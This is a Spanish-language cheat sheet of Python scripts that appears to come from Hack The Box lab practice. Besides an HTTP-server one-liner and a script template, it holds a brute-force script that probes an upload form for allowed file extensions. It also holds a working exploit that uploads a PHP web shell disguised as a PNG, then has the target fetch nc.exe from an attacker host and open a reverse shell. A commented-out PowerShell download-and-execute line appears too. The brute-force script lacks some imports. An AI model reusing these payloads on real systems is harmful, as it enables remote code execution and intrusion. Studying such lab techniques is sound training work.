# Scripts y cosas en Python

Se muestran a continuación utilidades mas usadas en python.

## Servidor HTTP

Se crea un servidor **HTTP** en el directorio actual:

<pre>
python3 -m http.server 8080
</pre>

## Script básico

Se crea plantilla de Script básico. **NO COPIAR, ESCRIBIR**.

Se muestra y se crea script_basico.py.

<pre>
#!/usr/bin/python3

# Importaciones mas comunoes
import requests, signal, sys, time


def def_handler(sig, frame):

	print("\n\n[!] Saliendo ....\n")
	sys.exit(1)

# Ctlr+C
signal.signal(signal.SIGINT, def_handler)

def executeCommand():

	print("Ejecutando .... ")
	time.sleep(10)
	print("Ejecutado")


if __name__ == '__main__':

	executeCommand()

</pre>

## Script fuerza bruta maquina Bounty

~~~
import signal, time, pdb, sys, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
transfer_url = "http://10.10.10.93/transfer.aspx"
burp = {'http': 'http://127.0.0.1:8080'}

def uploadFile(extension):

    s = requests.session()
    r = s.get(transfer_url)

    viewState = re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0]
    eventValidation = re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    post_data = {
        '__VIEWSTATE': viewState,
        '__EVENTVALIDATION': eventValidation,
        'btnUpload': 'Upload'
    }

    fileUploaded = {'FileUpload1': ('Prueba%s' % extension, 'Esto es una prueba')}

    r = s.post(transfer_url, data=post_data, files=fileUploaded)

    if "Invalid File. Please try again" not in r.text:
        log.info("La extensiÃ³n %s es vÃ¡lida" % extension)

if __name__ == '__main__':

    f = open("/usr/share/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt", "rb")

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    for extension in f.readlines():
        extension = extension.decode().strip()
        p1.status("Probando con la extensiÃ³n %s" % extension)
        uploadFile(extension)
~~~

## Script acceso maquina Buff

~~~ 
#!/usr/bin/python3

from pwn import *
import signal, time, pdb, sys, requests

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctlr+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

url = "http://10.10.10.198:8080/"
context ="upload.php?id="
internal_id = "gmsshell2"
png_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
upload_url= url + context + internal_id
#comando = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/PS.ps1')"
comando = "//10.10.14.16/smbFolder/nc.exe -e cmd 10.10.14.16 4444"
# comando = "ping 10.10.14.16"
shell_url = "%supload/%s.php" % (url,internal_id)

def makeRequest():

	print("Iniciando ataque ....")
	sleep(2)

	data = {'pupload': 'upload'}

	file = {"file":
		(
			"%s.php.png" % internal_id,  
			png_magicBytes+'\n'+r'<?php echo shell_exec("' + comando +'"); ?>'
			,'image/png', {'Content-Disposition': 'form-data'}
		)
	}

	print("Enviando petición ....")
	# Enviamos la petición
	s = requests.session()
	r = s.post(url=upload_url, files=file, data=data, verify=False)
	sleep(2)

	print("Ejecutando comando ....")

	r = s.get(shell_url, verify=False)
	sleep(2)

	print("Finalizamos ataque")
	sleep(1)
	sys.exit(0)

if __name__ == "__main__":

	makeRequest()

~~~ 
